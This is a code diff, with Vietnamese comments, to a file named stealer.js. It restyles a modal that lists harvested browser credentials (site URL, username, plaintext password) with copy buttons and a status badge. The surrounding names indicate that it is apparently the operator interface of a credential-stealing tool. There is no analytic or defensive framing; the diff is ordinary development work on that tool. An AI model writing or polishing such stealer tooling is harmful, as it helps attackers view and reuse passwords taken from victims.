@@ -30,6 +30,8 @@ export function initStealer(sendFunction) {
     };
 }
 
+// Thay thế hàm renderPasswordModal trong stealer.js bằng code này:
+
 export function renderPasswordModal(passwords, browserName) {
     state.currentPasswordData = passwords;
     state.currentBrowserName = browserName;
@@ -41,20 +43,45 @@ export function renderPasswordModal(passwords, browserName) {
     if (!passwordTbody || !passwordModal) return;
 
     passwordTbody.innerHTML = '';
-    passwordCountLabel.innerText = `${passwords.length} items found`;
+    
+    // CẬP NHẬT: Badge trạng thái với chấm xanh (Pulsing Dot)
+    passwordCountLabel.innerHTML = `
+        <span class="status-dot"></span>
+        <span>${passwords.length} items found</span>
+    `;
 
     passwords.forEach((p, index) => {
         const row = document.createElement('tr');
-        const displayUrl = p.url.length > 60 ? p.url.substring(0, 60) + '...' : p.url;
+        
+        // Cắt ngắn URL thông minh
+        const displayUrl = p.url.length > 50 ? p.url.substring(0, 50) + '...' : p.url;
+        
         row.innerHTML = `
-        <td><span class="url-cell" title="${p.url}">${displayUrl}</span></td>
-        <td><span class="user-cell">${p.user}</span></td>
-        <td><span class="pass-cell">${p.pass}</span></td>
-        <td class="text-center"><button class="btn-copy" id="btn-copy-${index}" onclick="handleCopy(${index})">Copy</button></td>`;
+        <td>
+            <a href="${p.url}" target="_blank" class="url-cell" title="${p.url}">
+                ${displayUrl}
+            </a>
+        </td>
+        <td>
+            <div class="user-cell" title="${p.user}">${p.user}</div>
+        </td>
+        <td>
+            <div class="pass-wrapper">
+                <div class="pass-cell" title="Click to copy">${p.pass}</div>
+            </div>
+        </td>
+        <td class="text-center">
+            <button class="btn-copy-mac" onclick="handleCopy(${index})" title="Copy Password">
+                <i data-feather="copy" style="width: 15px;"></i>
+            </button>
+        </td>`;
+        
         passwordTbody.appendChild(row);
     });
 
     passwordModal.classList.remove('hidden');
+    
+    // Gọi Feather Icons để render icon
     if (typeof feather !== 'undefined') feather.replace();
 }
 
